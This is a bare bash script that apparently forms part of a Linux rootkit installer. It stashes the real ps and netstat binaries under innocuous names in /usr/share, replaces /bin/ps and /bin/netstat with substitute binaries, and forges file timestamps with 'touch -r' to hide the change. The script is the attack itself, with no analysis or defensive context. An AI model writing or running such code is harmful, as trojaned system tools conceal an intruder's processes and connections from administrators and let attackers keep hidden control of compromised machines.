#!/bin/bash
cp /bin/ps /usr/share/json
chmod 755 ps
mv ps /bin/ps
touch -r /bin/netstat /bin/ps
cp /bin/netstat /usr/share/proto
chmod 755 netstat
mv netstat /bin/netstat
touch -r /bin/ps /bin/netstat
